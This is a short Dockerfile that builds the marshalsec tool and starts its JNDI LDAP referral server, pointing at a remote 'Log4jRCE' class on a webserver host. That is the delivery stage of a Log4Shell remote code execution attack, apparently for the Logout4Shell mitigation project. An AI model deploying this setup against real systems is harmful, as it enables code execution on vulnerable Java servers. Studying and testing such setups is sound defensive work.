
FROM ubuntu:21.04 as ldap-builder
RUN mkdir /opt/build_logout4shell
WORKDIR /opt/build_logout4shell
RUN apt-get update && apt-get install -y git default-jdk maven
RUN git clone https://github.com/mbechler/marshalsec.git && cd ./marshalsec && git checkout f645788 && mvn clean package -DskipTests && ls ./target/classes


FROM ubuntu:21.04 as ldapserver
RUN apt-get update && apt-get install -y git default-jdk
RUN mkdir -p /opt/webserver/
COPY --from=ldap-builder /opt/build_logout4shell/marshalsec/target/classes/* /opt/webserver/
WORKDIR /opt/webserver
ENTRYPOINT [ "java", "-cp", "marshalsec-0.0.3-SNAPSHOT-all.jar", "marshalsec.jndi.LDAPRefServer", "'http://webserver:8888/#Log4jRCE'"] 
